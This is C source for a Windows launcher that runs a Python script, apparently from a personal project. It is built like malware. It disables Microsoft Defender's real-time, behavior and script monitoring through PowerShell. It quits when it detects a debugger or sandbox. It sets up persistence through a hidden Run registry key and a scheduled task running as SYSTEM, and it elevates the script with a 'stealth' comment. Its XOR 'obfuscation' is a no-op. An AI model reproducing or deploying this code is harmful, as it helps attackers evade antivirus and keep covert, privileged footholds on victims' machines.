#include <windows.h>
#include <wincrypt.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#define XOR_KEY 0x55
#define FALSE 0
#define TRUE 1

void XOR(char* data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= XOR_KEY;
    }
}

char* RandomString(int length) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    char* result = (char*)malloc(length + 1);
    srand((unsigned int)time(NULL));

    for (int i = 0; i < length; i++) {
        result[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    result[length] = '\0';
    return result;
}

int IsDebugged() {
    return IsDebuggerPresent();
}

int IsSandbox() {
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    GlobalMemoryStatusEx(&memStatus);

    return (sysInfo.dwNumberOfProcessors < 2) || (memStatus.ullTotalPhys < (2ULL * 1024 * 1024 * 1024));
}

int InstallPersistence(const char* exePath) {
    HKEY hKey;
    char* randomName = RandomString(12);
    LPCSTR subKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

    if (RegCreateKeyExA(HKEY_CURRENT_USER, subKey, 0, NULL,
                        REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, randomName, 0, REG_SZ, (BYTE*)exePath, strlen(exePath));
        RegCloseKey(hKey);
    }
    free(randomName);

    char taskCommand[512];
    snprintf(taskCommand, sizeof(taskCommand),
             "schtasks /create /tn \"SystemHealthMonitor\" /tr \"%s\" /sc onlogon /ru SYSTEM /f", exePath);
    WinExec(taskCommand, SW_HIDE);

    return TRUE;
}

void DisableDefenderTemporarily() {
    system("powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"");
    system("powershell -Command \"Set-MpPreference -DisableBehaviorMonitoring $true\"");
    system("powershell -Command \"Set-MpPreference -DisableScriptScanning $true\"");
}

void ShowError(const char* message, DWORD errorCode) {
    char buffer[512];
    sprintf(buffer, "%s\nError Code: %lu", message, errorCode);
    MessageBoxA(NULL, buffer, "Execution Error", MB_ICONERROR);
}

int main() {
    DisableDefenderTemporarily();

    if (IsDebugged() || IsSandbox()) {
        ExitProcess(0);
    }

    char pythonPath[MAX_PATH] = "C:\\Users\\akbar\\AppData\\Local\\Programs\\Python\\Python312\\python.exe";
    char scriptPath[MAX_PATH] = "D:\\allmodul\\clientask.py";

    size_t pythonLen = strlen(pythonPath);
    size_t scriptLen = strlen(scriptPath);
    
    XOR(pythonPath, pythonLen);
    XOR(scriptPath, scriptLen);
    XOR(pythonPath, pythonLen);  // Decrypt
    XOR(scriptPath, scriptLen);  // Decrypt

    if (!PathFileExistsA(pythonPath)) {
        char* paths[] = {
            "C:\\Python312\\python.exe",
            "C:\\Python311\\python.exe",
            "C:\\Program Files\\Python312\\python.exe",
            "C:\\Users\\%USERNAME%\\AppData\\Local\\Programs\\Python\\Python312\\python.exe"
        };

        for (int i = 0; i < sizeof(paths) / sizeof(paths[0]); i++) {
            char expandedPath[MAX_PATH];
            ExpandEnvironmentStringsA(paths[i], expandedPath, MAX_PATH);
            if (PathFileExistsA(expandedPath)) {
                strcpy(pythonPath, expandedPath);
                break;
            }
        }

        if (!PathFileExistsA(pythonPath)) {
            ShowError("Python interpreter not found.", GetLastError());
            return 1;
        }
    }

    if (!PathFileExistsA(scriptPath)) {
        ShowError("Python script not found.", GetLastError());
        return 2;
    }

    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    InstallPersistence(exePath);

    // Prepare quoted parameters for ShellExecute
    char fullParams[MAX_PATH * 2];
    snprintf(fullParams, sizeof(fullParams), "\"%s\"", scriptPath);

    // Logging for debugging
    FILE* f = fopen("launcher_log.txt", "a");
    fprintf(f, "Launching: %s %s\n", pythonPath, fullParams);
    fclose(f);

    SHELLEXECUTEINFOA shExInfo = {0};
    shExInfo.cbSize = sizeof(shExInfo);
    shExInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
    shExInfo.hwnd = NULL;
    shExInfo.lpVerb = "runas";
    shExInfo.lpFile = pythonPath;
    shExInfo.lpParameters = fullParams;
    shExInfo.lpDirectory = NULL;
    shExInfo.nShow = SW_SHOW; // use SW_HIDE for stealth
    shExInfo.hInstApp = NULL;

    if (!ShellExecuteExA(&shExInfo)) {
        DWORD err = GetLastError();
        ShowError("ShellExecuteEx failed", err);
        return 3;
    }

    CloseHandle(shExInfo.hProcess);
    return 0;
}
